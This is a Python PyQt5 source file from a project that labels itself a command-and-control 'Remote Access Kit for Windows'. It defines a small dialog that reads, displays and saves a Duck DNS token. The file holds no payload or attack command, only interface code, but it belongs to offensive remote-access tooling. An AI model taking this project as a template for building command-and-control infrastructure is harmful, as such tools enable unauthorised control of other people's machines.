#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.23
# -------------------------------------------------------------
from PyQt5 import QtCore, QtWidgets
from core.logging.logging import DNSconfigs
from core.utils.utils import Notifications
from core.Qt5.icons import IconObj

class Ui_dns_token_window(object):

    #Function updates token,closes window and notifys user that the token was updated
    def update_token(self,new_token,dns_token_window):
        DNSconfigs().write_new_token(new_token)                                     #Write the token to the cfg file
        dns_token_window.close()                                                    #Close the window
        Notifications().raise_notification(f'Updated token to {new_token}','Success') #Raise notification

    def setupUi(self, dns_token_window):
        """
        Initialize UI parameters
        """
        dns_token_window.setObjectName("dns_token_window")
        dns_token_window.resize(400, 136)
        dns_token_window.setWindowIcon(IconObj().duck_dns_icon)
        """
        Create widget objects
        """
        self.update_dns_button = QtWidgets.QPushButton(dns_token_window,clicked=lambda: self.update_token(self.dns_token_input.text(),dns_token_window))
        self.dns_token_input = QtWidgets.QLineEdit(dns_token_window)
        """
        set widget geometery
        """
        self.update_dns_button.setGeometry(QtCore.QRect(260, 100, 131, 31))
        self.dns_token_input.setGeometry(QtCore.QRect(10, 30, 381, 33))
        """
        Set widget names
        """
        self.update_dns_button.setObjectName("pushButton")
        self.dns_token_input.setObjectName("dns_token_input")
        """
        Finish setting up UI
        """
        self.retranslateUi(dns_token_window)
        QtCore.QMetaObject.connectSlotsByName(dns_token_window)

    def retranslateUi(self, dns_token_window):
        _translate = QtCore.QCoreApplication.translate
        dns_token_window.setWindowTitle(_translate("dns_token_window", "Duck DNS Token"))
        self.update_dns_button.setText(_translate("dns_token_window", "Update Token"))
        current_token = DNSconfigs().retrieve_dns_token()                           #Retrieve current dns token from file
        self.dns_token_input.setText(_translate("dns_token_window", current_token)) #Add token to the token input widget
